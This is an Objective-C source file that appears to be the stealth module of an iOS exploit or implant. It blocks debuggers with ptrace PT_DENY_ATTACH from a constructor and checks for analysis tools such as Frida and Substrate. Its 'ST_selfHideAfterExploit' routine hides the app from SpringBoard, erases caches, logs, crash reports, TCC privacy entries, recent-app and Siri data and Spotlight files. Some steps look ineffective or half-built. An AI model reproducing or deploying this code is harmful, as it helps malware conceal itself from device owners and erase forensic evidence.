#import "Stealth.h"
#import <UIKit/UIKit.h>
#import <objc/runtime.h>
#import <objc/message.h>
#import <dlfcn.h>
#import <sys/sysctl.h>
#import <sys/types.h>
#import <unistd.h>
#import <signal.h>
#import <mach-o/dyld.h>
#import <mach/mach.h>
#import <string.h>
#import <stdlib.h>
#import <stdio.h>
#import <fcntl.h>
#import <dirent.h>
#import <os/log.h>

#ifndef PT_DENY_ATTACH
#define PT_DENY_ATTACH 31
#endif

typedef int (*ptrace_ptr_t)(int, pid_t, caddr_t, int);

static void st_deny_attach(void) {
    void *h = dlopen(NULL, RTLD_NOW);
    if (!h) return;
    ptrace_ptr_t p = (ptrace_ptr_t)dlsym(h, "ptrace");
    if (p) p(PT_DENY_ATTACH, 0, 0, 0);
}

static int st_debugger_sysctl(void) {
    int mib[4] = {CTL_KERN, KERN_PROC, KERN_PROC_PID, getpid()};
    struct kinfo_proc info;
    size_t size = sizeof(info);
    memset(&info, 0, sizeof(info));
    if (sysctl(mib, 4, &info, &size, NULL, 0) != 0) return 0;
    return (info.kp_proc.p_flag & P_TRACED) != 0;
}

static int st_parent_suspicious(void) {
    int mib[4] = {CTL_KERN, KERN_PROC, KERN_PROC_PID, getppid()};
    struct kinfo_proc info;
    size_t size = sizeof(info);
    memset(&info, 0, sizeof(info));
    if (sysctl(mib, 4, &info, &size, NULL, 0) != 0) return 0;
    const char *n = info.kp_proc.p_comm;
    if (!n) return 0;
    if (strstr(n, "debugserver") || strstr(n, "lldb") || strstr(n, "gdb") ||
        strstr(n, "frida") || strstr(n, "cycript") || strstr(n, "injector")) return 1;
    return 0;
}

static int st_dyld_suspicious(void) {
    uint32_t c = _dyld_image_count();
    for (uint32_t i = 0; i < c; i++) {
        const char *n = _dyld_get_image_name(i);
        if (!n) continue;
        if (strstr(n, "FridaGadget") || strstr(n, "frida") || strstr(n, "cycript") ||
            strstr(n, "libcycript") || strstr(n, "Substrate") || strstr(n, "libsubstrate") ||
            strstr(n, "MobileSubstrate") || strstr(n, "CydiaSubstrate") || strstr(n, "libhooker") ||
            strstr(n, "substitute") || strstr(n, "TweakInject") || strstr(n, "SSLKillSwitch") ||
            strstr(n, "Flex.dylib") || strstr(n, "RevealServer") || strstr(n, "libInjector") ||
            strstr(n, "Frida") || strstr(n, "gadget")) return 1;
    }
    return 0;
}

int ST_isDebuggerAttached(void) {
    if (st_debugger_sysctl()) return 1;
    if (st_parent_suspicious()) return 1;
    return 0;
}

int ST_detectHooks(void) {
    if (st_dyld_suspicious()) return 1;
    if (getenv("DYLD_INSERT_LIBRARIES") || getenv("_MSSafeMode") || getenv("FRIDA_SERVER")) return 1;
    return 0;
}

void ST_denyAttach(void) {
    st_deny_attach();
}

static id st_workspace(void) {
    Class c = NSClassFromString(@"LSApplicationWorkspace");
    if (!c) return nil;
    SEL s = NSSelectorFromString(@"defaultWorkspace");
    if (![c respondsToSelector:s]) return nil;
    return ((id (*)(id, SEL))objc_msgSend)(c, s);
}

static id st_proxy(void) {
    NSString *bid = [[NSBundle mainBundle] bundleIdentifier];
    if (!bid) return nil;
    Class c = NSClassFromString(@"LSApplicationProxy");
    if (!c) return nil;
    SEL s = NSSelectorFromString(@"applicationProxyForIdentifier:");
    if (![c respondsToSelector:s]) return nil;
    return ((id (*)(id, SEL, id))objc_msgSend)(c, s, bid);
}

void ST_hideFromSpringBoard(void) {
    @autoreleasepool {
        id ws = st_workspace();
        if (!ws) return;

        NSString *bid = [[NSBundle mainBundle] bundleIdentifier];
        if (!bid) return;

        SEL hideSel = NSSelectorFromString(@"setHidden:forBundleIdentifier:");
        if ([ws respondsToSelector:hideSel]) {
            ((void (*)(id, SEL, BOOL, id))objc_msgSend)(ws, hideSel, YES, bid);
        }

        NSString *sbPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Library/Preferences/com.apple.springboard.plist"];
        NSMutableDictionary *sb = [NSMutableDictionary dictionaryWithContentsOfFile:sbPath];
        if (sb) {
            NSMutableArray *hidden = [sb[@"SBHiddenApplications"] mutableCopy] ?: [NSMutableArray array];
            if (![hidden containsObject:bid]) {
                [hidden addObject:bid];
                sb[@"SBHiddenApplications"] = hidden;
                [sb writeToFile:sbPath atomically:YES];
            }
        }

        SEL rebuild = NSSelectorFromString(@"_rebuildApplicationLibraries");
        if ([ws respondsToSelector:rebuild]) {
            ((void (*)(id, SEL))objc_msgSend)(ws, rebuild);
        }
    }
}

void ST_zeroStorageFootprint(void) {
    @autoreleasepool {
        NSString *bid = [[NSBundle mainBundle] bundleIdentifier];
        if (!bid) return;

        NSArray *paths = @[
            NSSearchPathForDirectoriesInDomains(NSCachesDirectory, NSUserDomainMask, YES).firstObject,
            NSTemporaryDirectory(),
            [NSHomeDirectory() stringByAppendingPathComponent:@"Library/Logs"],
            [NSHomeDirectory() stringByAppendingPathComponent:@"tmp"]
        ];
        NSFileManager *fm = [NSFileManager defaultManager];
        for (NSString *p in paths) {
            if (!p) continue;
            NSArray *items = [fm contentsOfDirectoryAtPath:p error:nil];
            for (NSString *item in items) {
                NSString *full = [p stringByAppendingPathComponent:item];
                [fm removeItemAtPath:full error:nil];
            }
        }

        void *mi = dlopen("/System/Library/PrivateFrameworks/MobileInstallation.framework/MobileInstallation", RTLD_LAZY);
        if (mi) {
            dlclose(mi);
        }
    }
}

void ST_suppressPrivacyIndicators(void) {
    @autoreleasepool {
        NSString *tcc = [NSHomeDirectory() stringByAppendingPathComponent:@"Library/TCC"];
        NSFileManager *fm = [NSFileManager defaultManager];
        if ([fm fileExistsAtPath:tcc]) {
            NSArray *items = [fm contentsOfDirectoryAtPath:tcc error:nil];
            for (NSString *item in items) {
                if ([item containsString:[[NSBundle mainBundle] bundleIdentifier] ?: @""]) {
                    [fm removeItemAtPath:[tcc stringByAppendingPathComponent:item] error:nil];
                }
            }
        }
    }
}

void ST_suppressLogging(void) {
    @autoreleasepool {
        NSString *logDir = [NSHomeDirectory() stringByAppendingPathComponent:@"Library/Logs"];
        NSFileManager *fm = [NSFileManager defaultManager];
        NSArray *items = [fm contentsOfDirectoryAtPath:logDir error:nil];
        for (NSString *item in items) {
            [fm removeItemAtPath:[logDir stringByAppendingPathComponent:item] error:nil];
        }
        NSString *diag = [NSHomeDirectory() stringByAppendingPathComponent:@"Library/Logs/DiagnosticReports"];
        items = [fm contentsOfDirectoryAtPath:diag error:nil];
        for (NSString *item in items) {
            if ([item containsString:@"3105"] || [item containsString:@"ThreeOne"] || [item containsString:@"X"]) {
                [fm removeItemAtPath:[diag stringByAppendingPathComponent:item] error:nil];
            }
        }
    }
}

void ST_clearRecentAndSiri(void) {
    @autoreleasepool {
        NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
        NSArray *keys = @[
            @"SBRecentApplications",
            @"SBAppSwitcherModel",
            @"SiriSuggestions",
            @"com.apple.siri.suggestions",
            @"RecentApps",
            @"AppSuggestions"
        ];
        for (NSString *k in keys) {
            [ud removeObjectForKey:k];
        }
        [ud synchronize];

        NSString *spotlight = [NSHomeDirectory() stringByAppendingPathComponent:@"Library/Spotlight"];
        NSFileManager *fm = [NSFileManager defaultManager];
        if ([fm fileExistsAtPath:spotlight]) {
            NSArray *items = [fm contentsOfDirectoryAtPath:spotlight error:nil];
            for (NSString *item in items) {
                [fm removeItemAtPath:[spotlight stringByAppendingPathComponent:item] error:nil];
            }
        }
    }
}

void ST_selfHideAfterExploit(void) {
    ST_hideFromSpringBoard();
    ST_zeroStorageFootprint();
    ST_suppressPrivacyIndicators();
    ST_suppressLogging();
    ST_clearRecentAndSiri();
}

void ST_fullStealthPass(void) {
    st_deny_attach();
    if (ST_isDebuggerAttached() || ST_detectHooks()) {
        // proceed with hide anyway
    }
    ST_selfHideAfterExploit();
}

void ST_applyEarlyStealth(void) {
    st_deny_attach();
}

__attribute__((constructor)) static void ST_ctor(void) {
    st_deny_attach();
}
